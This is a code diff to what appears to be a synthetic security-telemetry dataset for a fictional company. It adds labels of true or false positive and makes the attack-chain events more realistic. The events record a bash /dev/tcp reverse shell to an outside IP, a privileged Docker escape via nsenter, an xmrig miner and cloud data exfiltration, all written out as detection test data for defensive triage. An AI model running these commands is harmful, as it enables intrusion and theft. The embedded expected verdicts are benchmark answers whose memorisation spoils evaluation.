@@ -261,7 +261,8 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     id: "rs_fw_004", ts: "2026-05-10T14:00:00.000Z",
     source: "firewall", event_type: "net_connection", severity: "high",
     vendor: "FortiGate", src_ip: "45.83.66.131", dst_ip: "172.16.14.5", dst_port: 3389,
-    protocol: "tcp",
+    protocol: "tcp", expected_verdict: "fp",
+    fp_explanation: "Opportunistic internet-wide RDP scanning hits RocketStack's public IP range constantly. The perimeter policy denied the connection before any handshake completed (0 bytes sent), and no other telemetry from 172.16.14.5 or this source IP correlates with it — routine background noise, not a targeted or successful attempt.",
     description: "Inbound RDP connection attempt from 45.83.66.131 to 172.16.14.5 — denied by policy 1",
     raw: { "data.type": "traffic", "data.subtype": "forward", "data.logid": "0000000015", "data.level": "warning", "data.action": "deny", "data.policyid": "1", "data.service": "RDP", "data.srccountry": "Germany", "data.sentbyte": "0", "data.rcvdbyte": "60", "firewall.action": "block", "action_result": "blocked" }
   },
@@ -340,6 +341,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     source: "okta", event_type: "privilege_escalation", severity: "high",
     vendor: "Okta", user_email: "m.nguyen@rocketstack.io",
     hostname: "LAP-DEV-12",
+    expected_verdict: "tp", is_detection: true,
     description: "m.nguyen granted Okta Super Organization Admin role on LAP-DEV-12 — unverified",
     it_verify_result: "unverified",
     it_verify_message: "IT has no record of a request to elevate m.nguyen to Okta Super Admin. m.nguyen is a mid-level developer with no business need for this role. No open or recently approved change ticket exists. This event occurred outside business hours. Investigate immediately — possible account compromise.",
@@ -484,13 +486,13 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     vendor: "AWS CloudTrail", user_email: "t.chen@rocketstack.io", src_ip: "185.220.101.47",
     user_title: "Data Engineer",
     mitre_technique: "T1530", mitre_tactic: "Collection",
-    description: "t.chen synced 28 GB S3 customer PII to external AWS account at 22:47",
+    expected_verdict: "tp", is_detection: true,
+    description: "t.chen synced S3 customer PII objects to an external AWS account at 22:47",
     raw: {
       "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.eventName": "CopyObject",
-      "aws.cloudtrail.awsRegion": "us-east-1", "aws.cloudtrail.request_parameters.source_bucket": "prod-customer-data",
+      "aws.cloudtrail.awsRegion": "us-east-1", "aws.cloudtrail.request_parameters.source_bucket": "rocketstack-prod-customer-data",
       "aws.cloudtrail.request_parameters.destination_bucket": "s3://external-acct-774412/exfil",
       "aws.cloudtrail.userIdentity.userName": "t.chen",
-      "aws.cloudtrail.additional_event_data.bytes_transferred_out": "30064771072",
       "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
       "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0",
       "source.geo.country_iso_code": "NL", "source.geo.city_name": "Amsterdam",
@@ -504,6 +506,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     user_title: "Data Engineer",
     src_ip: "185.220.101.47",
     mitre_technique: "T1567.002", mitre_tactic: "Exfiltration",
+    expected_verdict: "tp", is_detection: true,
     description: "t.chen ran rclone on LAP-TCHEN copying the local Downloads folder to a remote named mega",
     process: { name: "rclone", pid: 7821, parent_name: "bash", parent_pid: 7700,
                user: "t.chen", cmdline: "rclone copy /Users/t.chen/Downloads mega:backup --progress" },
@@ -511,7 +514,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
       "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high",
       "crowdstrike.TechniqueId": "T1567.002", "crowdstrike.Tactic": "Exfiltration",
       "process.command_line": "rclone copy /Users/t.chen/Downloads mega:backup --progress",
-      "network.bytes_out": "4404019200", "destination.domain": "g.api.mega.co.nz",
+      "network.bytes_out": "6710886400", "destination.domain": "g.api.mega.co.nz",
       "action_result": "detect_only" }
   },
 
@@ -551,6 +554,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     vendor: "Google Workspace Audit", user_email: "p.watts@rocketstack.io", src_ip: "185.220.101.47",
     user_title: "Security Engineer",
     mitre_technique: "T1114.003", mitre_tactic: "Collection",
+    expected_verdict: "tp", is_detection: true,
     description: "p.watts created a Gmail filter forwarding all inbound mail to p.watts@tutanota.com at 23:52",
     it_verify_result: "unverified",
     raw: {
@@ -3257,7 +3261,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
   // ── Chain A ──────────────────────────────────────────────────────────────
   {
     id: "rs_a1", ts: "2026-05-10T10:10:00.000Z", source: "okta", event_type: "auth_success",
-    severity: "medium", vendor: "Okta", user_email: "t.levy@rocketstack.io", src_ip: "185.220.101.15",
+    severity: "high", vendor: "Okta", user_email: "t.levy@rocketstack.io", src_ip: "185.220.101.15",
     description: "t.levy signed in from 185.220.101.15 four minutes after a sign-in from Tel Aviv; Okta flagged the IP as a proxy",
     mitre_technique: "T1078",
     raw: { "okta.eventType": "user.session.start", "okta.debugContext.debugData.riskLevel": "HIGH", "okta.debugContext.debugData.riskReasons": "ImpossibleTravel,TorIpAddress", "okta.client.ipAddress": "185.220.101.15", "okta.outcome.result": "SUCCESS", "okta.authenticationContext.credentialType": "PASSWORD", "okta.securityContext.isProxy": "true", "action_result": "allowed" }
@@ -3265,16 +3269,16 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
   {
     id: "rs_a2", ts: "2026-05-10T10:14:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
     severity: "medium", vendor: "AWS CloudTrail", user_email: "t.levy@rocketstack.io", src_ip: "185.220.101.15",
-    description: "t.levy's AWS account listed all S3 buckets and checked permissions on 12 of them from a TOR exit IP",
+    description: "t.levy's AWS credentials listed all S3 buckets from a TOR exit IP — reconnaissance ahead of the object read four minutes later",
     mitre_technique: "T1619",
     raw: { "aws.cloudtrail.eventName": "ListBuckets", "aws.cloudtrail.userAgent": "python-urllib3/1.26.9", "aws.cloudtrail.sourceIPAddress": "185.220.101.15", "action_result": "allowed" }
   },
   {
     id: "rs_a3", ts: "2026-05-10T10:18:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
     severity: "high", vendor: "AWS CloudTrail", user_email: "t.levy@rocketstack.io", src_ip: "185.220.101.15",
-    description: "t.levy's AWS credentials read objects from the rocketstack-prod-customers S3 bucket, 2.3 GB transferred out",
+    description: "t.levy's AWS credentials read objects from the rocketstack-prod-customer-data S3 bucket",
     mitre_technique: "T1530",
-    raw: { "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customers", "aws.cloudtrail.additional_event_data.bytes_transferred_out": "2305843009", "aws.cloudtrail.userAgent": "python-urllib3/1.26.9", "aws.cloudtrail.sourceIPAddress": "185.220.101.15", "action_result": "allowed" }
+    raw: { "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customer-data", "aws.cloudtrail.requestParameters.key": "exports/customers_full.csv", "aws.cloudtrail.userAgent": "python-urllib3/1.26.9", "aws.cloudtrail.sourceIPAddress": "185.220.101.15", "action_result": "allowed" }
   },
   {
     id: "rs_a4", ts: "2026-05-10T10:30:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
@@ -3289,8 +3293,8 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     severity: "medium", vendor: "CrowdStrike Falcon", hostname: "LAP-003", user_email: "s.amir@rocketstack.io", src_ip: "172.16.10.3",
     description: "Installing the npm package rocketstack-utils 3.2.1 ran an automatic post-install script on LAP-003",
     mitre_technique: "T1195.001",
-    process: { name: "node", pid: 9310, parent_name: "npm", parent_pid: 9300, user: "s.amir", cmdline: "node /tmp/.npm-install/postinstall.js" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" }
+    process: { name: "node", pid: 9310, parent_name: "npm", parent_pid: 9300, user: "s.amir", cmdline: "node /tmp/.npm-install/postinstall.js", hash: { sha256: "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c" } },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "crowdstrike.CommandLine": "node /tmp/.npm-install/postinstall.js", "crowdstrike.FileName": "node", "crowdstrike.FilePath": "/usr/local/bin/", "crowdstrike.ParentProcessName": "npm", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" }
   },
   {
     // DNS is SIEM-normalized (ECS dns.* schema), attributed to the DNS feed rather than
@@ -3307,15 +3311,19 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     severity: "high", vendor: "CrowdStrike Falcon", hostname: "LAP-003", src_ip: "172.16.10.3", dst_ip: "104.248.93.41", dst_port: 4444,
     description: "A node process on LAP-003 launched bash with a /dev/tcp redirect and connected out to 104.248.93.41:4444",
     mitre_technique: "T1059.004",
-    process: { name: "bash", pid: 9420, parent_name: "node", parent_pid: 9310, user: "s.amir", cmdline: "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1" },
-    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.Confidence": "high", "action_result": "allowed" }
+    process: { name: "bash", pid: 9420, parent_name: "node", parent_pid: 9310, user: "s.amir", cmdline: "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", hash: { sha256: "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584" } },
+    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.Confidence": "high", "crowdstrike.CommandLine": "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", "crowdstrike.FileName": "bash", "crowdstrike.FilePath": "/bin/", "crowdstrike.ParentProcessName": "node", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584", "action_result": "allowed" }
   },
   {
+    // Note: kept as ONE CloudTrail record (AttachUserPolicy) — a real CloudTrail
+    // event is always a single API call, never a "CreateUser,AttachUserPolicy"
+    // composite; the preceding CreateUser call by the same actor/session is
+    // referenced in the description as context, not fabricated as a raw field.
     id: "rs_b4", ts: "2026-05-10T09:01:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
     severity: "critical", vendor: "AWS CloudTrail", user_email: "s.amir@rocketstack.io", src_ip: "104.248.93.41",
-    description: "s.amir credentials created IAM user svc-backup-01 with AdministratorAccess",
+    description: "s.amir credentials attached AdministratorAccess to svc-backup-01, an IAM user the same session had just created",
     mitre_technique: "T1098",
-    raw: { "aws.cloudtrail.eventName": "CreateUser,AttachUserPolicy", "aws.cloudtrail.requestParameters.userName": "svc-backup-01", "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess", "aws.cloudtrail.sourceIPAddress": "104.248.93.41", "action_result": "allowed" }
+    raw: { "aws.cloudtrail.eventSource": "iam.amazonaws.com", "aws.cloudtrail.eventName": "AttachUserPolicy", "aws.cloudtrail.requestParameters.userName": "svc-backup-01", "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess", "aws.cloudtrail.sourceIPAddress": "104.248.93.41", "action_result": "allowed" }
   },
   // ── Chain C ──────────────────────────────────────────────────────────────
   {
@@ -3323,23 +3331,27 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     severity: "medium", vendor: "CrowdStrike Falcon", hostname: "LAP-007", user_email: "t.levy@rocketstack.io", src_ip: "172.16.10.7",
     description: "t.levy ran a Docker container on LAP-007 with --privileged, host PID/network namespaces and / mounted at /host",
     mitre_technique: "T1611",
-    process: { name: "docker", pid: 12001, parent_name: "zsh", parent_pid: 11800, user: "t.levy", cmdline: "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "action_result": "allowed" }
+    process: { name: "docker", pid: 12001, parent_name: "zsh", parent_pid: 11800, user: "t.levy", cmdline: "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh", hash: { sha256: "32bc2f4ca7cd25957d1bbf67a770f89fd7429fa3dd95dc8a6bdbf631dd392fee" } },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "crowdstrike.CommandLine": "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh", "crowdstrike.FileName": "docker", "crowdstrike.FilePath": "/usr/bin/", "crowdstrike.ParentProcessName": "zsh", "crowdstrike.UserName": "t.levy", "crowdstrike.SHA256HashData": "32bc2f4ca7cd25957d1bbf67a770f89fd7429fa3dd95dc8a6bdbf631dd392fee", "action_result": "allowed" }
   },
   {
     id: "rs_c2", ts: "2026-05-10T15:09:00.000Z", source: "edr", event_type: "process_create",
     severity: "medium", vendor: "CrowdStrike Falcon", hostname: "LAP-007", src_ip: "172.16.10.7",
-    description: "xmrig started as root on LAP-007 from a shell, connecting to pool.minexmr.com:4444",
+    description: "xmrig started as root on LAP-007 from a shell, connecting to supportxmr.com:5555",
     mitre_technique: "T1496",
-    process: { name: "xmrig", pid: 12050, parent_name: "sh", parent_pid: 12010, user: "root", cmdline: "xmrig --coin monero --url pool.minexmr.com:4444 --user 47abc..." },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "action_result": "allowed" }
+    process: { name: "xmrig", pid: 12050, parent_name: "sh", parent_pid: 12010, user: "root", cmdline: "xmrig --coin monero --url supportxmr.com:5555 --user 47abc...", hash: { sha256: "f1dd2a9fd0d3d74d8f83bcae85ec8e2b7c319dc330253ea3d437d1805e0ab2bf" } },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "crowdstrike.CommandLine": "xmrig --coin monero --url supportxmr.com:5555 --user 47abc...", "crowdstrike.FileName": "xmrig", "crowdstrike.FilePath": "/tmp/.cache/", "crowdstrike.ParentProcessName": "sh", "crowdstrike.UserName": "root", "crowdstrike.SHA256HashData": "f1dd2a9fd0d3d74d8f83bcae85ec8e2b7c319dc330253ea3d437d1805e0ab2bf", "action_result": "allowed" }
   },
   {
+    // LAP-007 is t.levy's laptop, not an EC2 instance — it has no instance-profile
+    // metadata service to abuse. The escaped container instead used t.levy's own
+    // cached AWS SSO (Okta-federated) session credentials found in ~/.aws on the
+    // host, so this is an AssumedRole call from the laptop's own IP, not IMDS.
     id: "rs_c3", ts: "2026-05-10T15:14:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
-    severity: "high", vendor: "AWS CloudTrail", src_ip: "172.16.10.7",
-    description: "The compromised container retrieved the production database master password from AWS Secrets Manager",
+    severity: "high", vendor: "AWS CloudTrail", user_email: "t.levy@rocketstack.io", src_ip: "172.16.10.7",
+    description: "The compromised container used t.levy's cached AWS SSO session credentials to retrieve the production database master password from AWS Secrets Manager",
     mitre_technique: "T1552.005",
-    raw: { "aws.cloudtrail.eventName": "GetSecretValue", "aws.cloudtrail.requestParameters.secretId": "rocketstack/prod/db-master-password", "aws.cloudtrail.userIdentity.type": "EC2InstanceMetadata", "action_result": "allowed" }
+    raw: { "aws.cloudtrail.eventSource": "secretsmanager.amazonaws.com", "aws.cloudtrail.eventName": "GetSecretValue", "aws.cloudtrail.requestParameters.secretId": "rocketstack/prod/db-master-password", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/rocketstack-developer-role/t.levy", "aws.cloudtrail.user_identity.session_issuer.user_name": "rocketstack-developer-role", "aws.cloudtrail.sourceIPAddress": "172.16.10.7", "action_result": "allowed" }
   },
   {
     id: "rs_c4", ts: "2026-05-10T15:22:00.000Z", source: "firewall", event_type: "net_connection",
@@ -3373,8 +3385,8 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
   {
     id: "rs_d3", ts: "2026-05-10T18:15:00.000Z", source: "okta", event_type: "auth_success",
     severity: "critical", vendor: "Okta", src_ip: "89.248.171.44",
-    user_email: "s.amir@rocketstack.io",
-    description: "Okta sign-in succeeded for s.amir from 89.248.171.44, the same IP as the preceding failures",
+    user_email: "n.shapiro@rocketstack.io",
+    description: "Okta sign-in succeeded for n.shapiro from 89.248.171.44, the same IP as the preceding failures",
     mitre_technique: "T1078", mitre_tactic: "Initial Access",
     raw: { "okta.eventType": "user.session.start", "okta.outcome.result": "SUCCESS",
            "okta.authenticationContext.credentialType": "PASSWORD", "okta.debugContext.debugData.riskLevel": "HIGH",
@@ -3385,11 +3397,11 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
   {
     id: "rs_d4", ts: "2026-05-10T18:17:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
     severity: "critical", vendor: "AWS CloudTrail", src_ip: "89.248.171.44",
-    user_email: "s.amir@rocketstack.io",
-    description: "The s.amir IAM user listed buckets and read from rocketstack-prod-customer-data from 89.248.171.44",
+    user_email: "n.shapiro@rocketstack.io",
+    description: "The n.shapiro IAM user listed buckets and read from rocketstack-prod-customer-data from 89.248.171.44",
     mitre_technique: "T1530", mitre_tactic: "Collection",
     raw: { "aws.cloudtrail.eventName": "ListBuckets", "aws.cloudtrail.userIdentity.type": "IAMUser",
-           "aws.cloudtrail.userIdentity.userName": "s.amir",
+           "aws.cloudtrail.userIdentity.userName": "n.shapiro",
            "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customer-data",
            "source.ip": "89.248.171.44", "source.geo.country_iso_code": "CN",
            "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0",
